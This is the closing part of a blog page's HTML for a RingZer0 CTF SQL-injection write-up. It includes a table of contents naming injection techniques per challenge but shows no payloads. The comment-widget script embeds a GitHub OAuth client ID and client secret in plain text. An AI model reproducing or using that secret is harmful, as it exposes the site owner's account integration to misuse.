+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/">
+        <span class="nav-arrow">← </span>
+        
+          TCTF | LD_PRELOAD系统劫持绕过disable_functions
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/04/09/CTF-%E5%98%89%E4%BC%9F%E6%96%AF%E6%9D%AF-web-wp/">
+        
+          CTF | 嘉伟斯杯_web_wp
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Challenge-1-Bypass-me-if-you-can-（万能密码）"><span class="toc-nav-text">Challenge 1 Bypass me if you can （万能密码）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Challenge-Access-list-（报错-联合）"><span class="toc-nav-text">Challenge Access list （报错+联合）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Login-portal-1-like注入"><span class="toc-nav-text">Login portal 1(like注入)</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Random-Login-Form（长度截断）"><span class="toc-nav-text">Random Login Form（长度截断）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Just-another-login-form-LDAP注入"><span class="toc-nav-text">Just another login form (LDAP注入)</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Po-po-po-po-postgresql-postgresql注入"><span class="toc-nav-text">Po po po po postgresql (postgresql注入)</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Login-form-Don’t-mess-with-Noemie（POST注入）"><span class="toc-nav-text">Login form | Don’t mess with Noemie（POST注入）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#What’s-the-definition-of-NULL-（sqlite联合注入）"><span class="toc-nav-text">What’s the definition of NULL （sqlite联合注入）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Login-portal-2-（sha1注入）"><span class="toc-nav-text">Login portal 2 （sha1注入）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Generate-random-quote-GET-过滤空格引号"><span class="toc-nav-text">Generate random quote (GET,过滤空格引号)</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Matrix-Fan-The-only-limits-are-yours（GET，编码引号）"><span class="toc-nav-text">Matrix Fan? The only limits are yours（GET，编码引号）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#No-more-hacking-for-me-源代码泄露双重编码"><span class="toc-nav-text">No more hacking for me! (源代码泄露双重编码)</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Don’t-Stumble-in-the-Process-（BOOL盲注）"><span class="toc-nav-text">Don’t Stumble in the Process （BOOL盲注）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Generate-random-quote-again-（双参数GET注入，转义字符）"><span class="toc-nav-text">Generate random quote again （双参数GET注入，转义字符）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#老外wp"><span class="toc-nav-text">老外wp</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Find-online-hot-single-Mom-（load-file注入）"><span class="toc-nav-text">Find online hot single Mom （load_file注入）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Login-portal-3-（POST-BOOL注入）"><span class="toc-nav-text">Login portal 3 （POST BOOL注入）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Lite-login-portal-sqlite盲注"><span class="toc-nav-text">Lite login portal (sqlite盲注)</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#burpsuite"><span class="toc-nav-text">burpsuite</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Internet-As-A-Service-point-7-（-4-lt-0e1union拼接注入）"><span class="toc-nav-text">Internet As A Service(point 7)（||4&lt;0e1union拼接注入）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Login-portal-4-（时间盲注）"><span class="toc-nav-text">Login portal 4 （时间盲注）</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/04/06/RingZer0-CTF-web-sql-WP/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "RingZer0_CTF_web-sql WP",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
